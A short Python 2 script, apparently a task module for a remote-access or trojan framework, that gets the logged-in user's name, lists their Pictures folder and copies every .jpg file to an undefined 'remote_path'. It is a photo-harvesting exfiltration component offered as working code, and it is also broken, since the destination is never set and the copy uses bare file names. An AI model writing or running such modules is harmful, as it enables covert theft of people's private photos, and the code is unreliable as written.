# -*- coding: utf-8 -*-
"""
Created on Mon Mar 28 20:49:04 2016

@author: root
"""

import shutil
import os

def run(**args):
    print "[*] In dircopy module"
    name = str(os.getlogin())
    source = os.listdir("/home/" + name + "/Pictures")
    destination = remote_path
    for files in source:
        if files.endswith(".jpg"):
            shutil.copy(files, destination)